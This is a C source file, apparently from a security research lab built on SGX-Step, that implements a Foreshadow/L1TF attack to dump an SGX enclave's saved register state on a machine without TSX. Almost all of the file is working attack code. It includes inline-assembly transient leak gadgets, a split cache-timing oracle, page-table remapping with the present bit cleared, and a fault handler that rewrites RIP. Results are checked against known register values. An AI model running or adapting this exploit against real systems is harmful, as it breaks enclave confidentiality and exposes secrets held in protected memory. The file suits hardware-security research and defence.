/*
 * GGSEC modifications and additions:
 * Copyright (C) 2026 Maciej Gojny, GG Advanced IT Security UG
 */
/*
 *  Foreshadow/L1TF SSA (GPRSGX) register-state dump on a real enclave, WITHOUT
 *  TSX -- for the i3-6100 lab host (microcode 0xba, no RTM).
 *
 *  Background: the upstream app/foreshadow DUMP_SSA path reads the enclave's
 *  saved-state area (SSA GPRSGX region) transiently from inside a plain SIGSEGV
 *  handler. Those transient reads of the revoked SSA alias FAULT; upstream
 *  relies on TSX to abort-suppress them. Without TSX the fault reaches the
 *  handler, which re-presents the *secret* alias (not the SSA alias), so the
 *  load re-faults forever -- the observed hang. This program does the SSA dump
 *  the way our secret extraction already works on this host: an SA_SIGINFO
 *  handler that, for a fault inside the SSA alias page, redirects RIP past the
 *  transient block (never re-presenting, never re-executing architecturally),
 *  and for the enclave's own asynchronous-exit fault (its revoked trigger page)
 *  reads one SSA pass and lets the enclave re-ERESUME for the next AEX.
 *
 *  Mechanism (classic Foreshadow-SGX):
 *    - enclave_run() loads known register values then touches its trigger page;
 *    - we revoke that page, so the access faults -> AEX -> the CPU writes the
 *      full register file into the SSA GPRSGX region (now resident in L1D);
 *    - we read that region transiently through a present-bit-cleared alias, with
 *      the split lo/hi oracle, in reload-all mode (one transient per trace, then
 *      time all slots -- valid here because the split slots sit in distinct L1D
 *      sets, unlike the flat 256-slot oracle);
 *    - many AEX passes + a per-byte majority vote absorb the residency noise
 *      (the SSA cools as the pass proceeds; the last cache line is the hardest,
 *      exactly as upstream notes).
 *
 *  Correctness is self-checking: enclave_run() sets rax=0xdeadbeefcafebabe,
 *  rbx=0xdabbad00dabbad00, rcx=0xd0000dbaaaaaaaad, rdx=0xdeadc0debaadf00d,
 *  r8=0x8888..., r9=0x9999..., r10..r15=0x1010...0x1515, so 12 registers
 *  (96 bytes) at known GPRSGX offsets are compared against ground truth.
 *
 *  Env: SSA_PASSES=<n> (AEX passes, default 60), SECRET_ONLY unused here.
 *  Links against stock PSW 2.27 exactly like app/foreshadow; reuses its Enclave.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <ucontext.h>
#include <sys/mman.h>

#include <sgx_urts.h>
#include "Enclave/encl_u.h"

#include "libsgxstep/config.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/cache.h"

#define ENCLAVE_SO      "Enclave/encl.so"
#define DEBUG_ENCLAVE   1

#define SLOT_SIZE       0x1040
#define LO_CLASSES      64
#define HI_CLASSES      4
#define SSA_BYTES       SGX_GPRSGX_SIZE       /* 184 */

char __attribute__((aligned(0x1000))) oracle_lo[SLOT_SIZE * LO_CLASSES];
char __attribute__((aligned(0x1000))) oracle_hi[SLOT_SIZE * HI_CLASSES];

sgx_enclave_id_t eid = 0;
void *secret_ptr = NULL, *secret_page = NULL;
void *ssa_ptr = NULL, *alias_ssa = NULL, *alias_ssa_page = NULL;
uint64_t *pte_ssa = NULL, pte_ssa_present = 0, pte_ssa_keep = 0;

static void *volatile skip_to = NULL;
static volatile unsigned long fault_skip = 0, aex_count = 0;
static int ssa_passes = 60;
static int done = 0;

/* vote tally per SSA byte */
static int votes[SSA_BYTES][256];

/*
 * Ground-truth register frame via EDBGRD. On the enclave AEX the CPU has just
 * written the full register file into the SSA; the enclave is now PAUSED in our
 * (CPL3, normal-context) #PF handler, so a debug read of the SSA succeeds
 * architecturally -- no L1D residency, no TSX. This is the SGX-Step debug-enclave
 * facility (as used by app/aep-redirect), NOT the Foreshadow transient attack; it
 * proves the AEX captured the registers and gives the transient path its target.
 */
static gprsgx_region_t shadow_edbgrd = {0};
static volatile int edbgrd_done = 0;

/* ------------------------------------------------------------ transient block */

static inline void leak_lo(void *base, void *adrs)
{
    asm volatile(
        "   lea 2f(%%rip), %%rax\n\t"
        "   mov %%rax, %0\n\t"
        "1: movb (%1), %%al\n\t"
        "   movzbl %%al, %%eax\n\t"
        "   and $0x3f, %%eax\n\t"
        "   imul %3, %%rax\n\t"
        "   movq (%2, %%rax), %%rdi\n\t"
        "2:\n\t"
        : "=m"(skip_to)
        : "r"(adrs), "r"(base), "r"((unsigned long) SLOT_SIZE)
        : "rax", "rdi", "memory");
}

static inline void leak_hi(void *base, void *adrs)
{
    asm volatile(
        "   lea 2f(%%rip), %%rax\n\t"
        "   mov %%rax, %0\n\t"
        "1: movb (%1), %%al\n\t"
        "   movzbl %%al, %%eax\n\t"
        "   shr $6, %%eax\n\t"
        "   imul %3, %%rax\n\t"
        "   movq (%2, %%rax), %%rdi\n\t"
        "2:\n\t"
        : "=m"(skip_to)
        : "r"(adrs), "r"(base), "r"((unsigned long) SLOT_SIZE)
        : "rax", "rdi", "memory");
}

static inline int set_of(void *p) { return (int)(((uint64_t) p >> 6) & 63); }

/*
 * Reload-all decode of one trace. One transient touches oracle[value_class];
 * then every slot is timed. The split slots live in distinct L1D sets, so the
 * reload scan does not evict them (unlike the flat 256-slot oracle). The one
 * unavoidable false positive is the slot that shares the SSA line's own set
 * (the transient's SSA read makes it read hot too), so that class is excluded
 * from the argmin -- with a fallback if it is in fact the true value.
 */
static int decode_trace(void *base, int classes, int high, void *adrs)
{
    int c, best = -1, excl = -1;
    unsigned long t, b = ~0UL, excl_t = ~0UL;
    int ssa_set = set_of(adrs);

    for (c = 0; c < classes; c++)
        flush((char *) base + (uint64_t) c * SLOT_SIZE);

    if (high) leak_hi(base, adrs);
    else      leak_lo(base, adrs);

    for (c = 0; c < classes; c++)
    {
        char *slot = (char *) base + (uint64_t) c * SLOT_SIZE;
        t = reload(slot);
        if (set_of(slot) == ssa_set) { excl = c; excl_t = t; continue; }
        if (t < b) { b = t; best = c; }
    }

    /* fallback: the excluded (SSA-set) slot is the only hot one -> it is the
     * true class after all */
    if (excl >= 0 && excl_t + 20 < b)
        best = excl;

    return best;
}

static int decode_byte(void *adrs)
{
    int lo = decode_trace(oracle_lo, LO_CLASSES, 0, adrs);
    int hi = decode_trace(oracle_hi, HI_CLASSES, 1, adrs);
    if (lo < 0) lo = 0;
    if (hi < 0) hi = 0;
    return ((hi & 3) << 6) | (lo & 0x3f);
}

/* one SSA pass: read all 184 bytes while the AEX-written frame is warm */
static void read_ssa_pass(void)
{
    int j;
    for (j = 0; j < SSA_BYTES; j++)
    {
        int b = decode_byte((char *) alias_ssa + j);
        votes[j][b & 0xff]++;
    }
}

/* ---------------------------------------------------------------- handler */

static void fault_handler(int sig, siginfo_t *si, void *ctx)
{
    ucontext_t *uc = (ucontext_t *) ctx;
    uint64_t addr = (uint64_t) si->si_addr;

    /* a transient SSA read faulted: skip past the block, never re-present */
    if ((addr & ~UINT64_C(0xfff)) == (uint64_t) alias_ssa_page)
    {
        fault_skip++;
        uc->uc_mcontext.gregs[REG_RIP] = (greg_t) skip_to;
        return;
    }

    /* otherwise: the enclave's asynchronous exit on its revoked trigger page.
     * The SSA GPRSGX region has just been written and is warm. */
    aex_count++;

    /* ground truth once: the enclave is paused here, debug-read the SSA */
    if (!edbgrd_done)
    {
        edbgrd(ssa_ptr, shadow_edbgrd.bytes, SSA_BYTES);
        edbgrd_done = 1;
    }

    if (!done && aex_count <= (unsigned long) ssa_passes)
    {
        *pte_ssa = pte_ssa_keep;    /* keep the SSA alias non-present, PFN kept */
        read_ssa_pass();
    }

    if (aex_count >= (unsigned long) ssa_passes && !done)
    {
        /* let the enclave finish: restore its trigger page */
        done = 1;
        if (mprotect(secret_page, 0x1000, PROT_READ | PROT_WRITE) != 0)
            _exit(4);
    }
    /* return without restoring -> enclave re-ERESUMEs -> next AEX/pass */
}

/* ---------------------------------------------------------------- verify */

struct { const char *name; int off; uint64_t val; } known[] = {
    { "rax", 0,   0xdeadbeefcafebabeULL },
    { "rcx", 8,   0xd0000dbaaaaaaaadULL },
    { "rdx", 16,  0xdeadc0debaadf00dULL },
    { "rbx", 24,  0xdabbad00dabbad00ULL },
    { "r8",  64,  0x8888888888888888ULL },
    { "r9",  72,  0x9999999999999999ULL },
    { "r10", 80,  0x1010101010101010ULL },
    { "r11", 88,  0x1111111111111111ULL },
    { "r12", 96,  0x1212121212121212ULL },
    { "r13", 104, 0x1313131313131313ULL },
    { "r14", 112, 0x1414141414141414ULL },
    { "r15", 120, 0x1515151515151515ULL },
};

/* ---------------------------------------------------------------- main */

int main(int argc, char **argv)
{
    sgx_launch_token_t token = {0};
    int updated = 0, i, j;
    struct sigaction sa;
    gprsgx_region_t shadow = {0};

    setvbuf(stdout, NULL, _IOLBF, 0);
    if (getenv("SSA_PASSES")) ssa_passes = atoi(getenv("SSA_PASSES"));
    if (ssa_passes < 1) ssa_passes = 1;
    info("SSA GPRSGX dump (no-TSX, split reload-all); passes=%d", ssa_passes);

    info("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave(ENCLAVE_SO, DEBUG_ENCLAVE,
                                   &token, &updated, &eid, NULL) );

    ASSERT( !claim_cpu(VICTIM_CPU) );
    ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );
    register_enclave_info();
    print_enclave_info();

    /* trigger page: the enclave secret line; revoking it makes enclave_run AEX */
    SGX_ASSERT( enclave_generate_secret(eid, &secret_ptr) );
    secret_page = (void *) ((uint64_t) secret_ptr & ~UINT64_C(0xfff));

    /*
     * SSA GPRSGX region of frame 0, computed explicitly. The library's
     * get_enclave_ssa_gprsgx_adrs() uses the CURRENT CSSA, which is 0 before any
     * AEX, so calling it during setup points 184 bytes BEFORE frame 0 -- the
     * wrong page. Frame 0's GPRSGX is the last 184 bytes of the first 4 KiB SSA
     * frame: base + OSSA + SSAFRAMESIZE - GPRSGX_SIZE, independent of CSSA.
     */
    {
        extern void *sgx_get_tcs(void);
        uint64_t ossa = 0;
        void *tcs = sgx_get_tcs();
        edbgrd((char *) tcs + SGX_TCS_OSSA_OFFSET, &ossa, sizeof(ossa));
        ssa_ptr = (char *) get_enclave_base() + ossa + SGX_SSAFRAMESIZE - SGX_GPRSGX_SIZE;
        info("tcs=%p ossa=%#lx -> frame0 GPRSGX ssa_ptr=%p (lib would give %p)",
             tcs, ossa, ssa_ptr, get_enclave_ssa_gprsgx_adrs());
    }
    alias_ssa = remap_page_table_level(ssa_ptr, PAGE);
    alias_ssa_page = (void *) ((uint64_t) alias_ssa & ~UINT64_C(0xfff));
    ASSERT( pte_ssa = remap_page_table_level(alias_ssa, PTE) );
    pte_ssa_present = *pte_ssa;
    pte_ssa_keep = MARK_NOT_PRESENT(pte_ssa_present);
    info("enclave SSA GPRSGX at %p; alias at %p (revoking alias access rights)",
         ssa_ptr, alias_ssa);
    ASSERT( !mprotect(alias_ssa_page, 0x1000, PROT_NONE) );
    *pte_ssa = pte_ssa_keep;
    print_pte(pte_ssa);

    /* SA_NODEFER: the SSA-read faults must reach the handler while we are
     * already inside it handling the enclave AEX. */
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = fault_handler;
    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
    ASSERT( !sigaction(SIGSEGV, &sa, NULL) );

    info_event("Foreshadow SSA frame extraction (real enclave)");
    info("revoking enclave trigger page and running enclave (faulting AEX loop)..");
    ASSERT( !mprotect(secret_page, 0x1000, PROT_NONE) );
    SGX_ASSERT( enclave_run(eid) );     /* returns once the handler restores the page */

    info("AEX passes: %lu; skipped SSA-read faults: %lu", aex_count, fault_skip);

    /* Keep the most common NON-ZERO reading per byte: a cold read leaks 0x00, so
     * a majority vote would just return 0; the real value shows up only in the
     * (possibly rare) passes where the SSA line survived to L1D. Fall back to 0
     * if the byte never leaked anything. */
    for (j = 0; j < SSA_BYTES; j++)
    {
        int best = 0, bestcount = 0;
        for (i = 1; i < 256; i++)
            if (votes[j][i] > bestcount) { bestcount = votes[j][i]; best = i; }
        shadow.bytes[j] = (uint8_t) best;
    }

    int n = (int)(sizeof(known)/sizeof(known[0]));

    /* ---- (1) EDBGRD ground truth: the debug-enclave facility, works ---- */
    info_event("GPRSGX via EDBGRD (debug-read ground truth, NOT the transient attack)");
    dump_gprsgx_region(&shadow_edbgrd);
    {
        int ok_regs = 0;
        for (i = 0; i < n; i++)
        {
            uint64_t got = 0;
            memcpy(&got, &shadow_edbgrd.bytes[known[i].off], 8);
            if (got == known[i].val) ok_regs++;
            info("  %-3s got=0x%016lx want=0x%016lx%s", known[i].name, got,
                 known[i].val, got == known[i].val ? "  [OK]" : "  [MISS]");
        }
        info("[EDBGRD] known registers fully correct: %d/%d", ok_regs, n);
    }

    /* ---- (2) Foreshadow transient result: the attack (blocked on this host) ---- */
    info_event("GPRSGX via Foreshadow transient read (the attack)");
    dump_gprsgx_region(&shadow);
    {
        int ok_regs = 0, ok_bytes = 0, total_bytes = 0;
        for (i = 0; i < n; i++)
        {
            uint64_t got = 0;
            memcpy(&got, &shadow.bytes[known[i].off], 8);
            int rb = 0, k, warm = 0;
            for (k = 0; k < 8; k++)
            {
                uint8_t want_b = ((uint8_t*)&known[i].val)[k];
                if (shadow.bytes[known[i].off + k] == want_b) rb++;
                warm += votes[known[i].off + k][want_b];   /* zero-byte-free regs = real signal */
            }
            ok_bytes += rb; total_bytes += 8;
            if (got == known[i].val) ok_regs++;
            info("  %-3s off=%3d got=0x%016lx  %d/8 bytes  warm-hits=%d/%d",
                 known[i].name, known[i].off, got, rb, warm, 8 * ssa_passes);
        }
        info("[TRANSIENT] known registers fully correct: %d/%d ; known bytes: %d/%d "
             "(no-0x00 regs are the real-signal control)", ok_regs, n, ok_bytes, total_bytes);
    }

    restore_system_state();
    return 0;
}
